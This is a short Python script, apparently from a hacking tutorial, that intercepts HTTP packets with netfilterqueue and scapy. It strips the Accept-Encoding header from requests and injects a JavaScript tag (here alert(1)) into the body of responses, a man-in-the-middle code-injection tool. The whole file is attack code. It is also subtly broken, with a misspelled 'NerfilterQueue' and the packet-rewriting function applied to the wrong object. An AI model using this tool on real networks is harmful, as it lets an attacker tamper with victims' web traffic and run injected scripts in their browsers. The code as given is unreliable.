#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re


ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    ip_packet = scapy.IP(packet.get_payload())
    if ip_packet.haslayer(scapy.Raw):
        if ip_packet[scapy.TCP].dport == 80:
            print("[+] HTTP Request")
            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", ip_packet[scapy.Raw].load)
            new_packet = set_load(packet, modified_load)
            packet.set_payload(new_packet)
        elif ip_packet[scapy.TCP].sport == 80:
            print("[+] HTTP Response")
            modified_load = ip_packet[scapy.Raw].load.replace("</body>", "</body><script>alert(1);</script>")
            new_packet = set_load(packet, modified_load)
            packet.set_payload(new_packet)
    packet.accept()


queue = netfilterqueue.NerfilterQueue()
queue.bind(0, process_packet)
queue.run()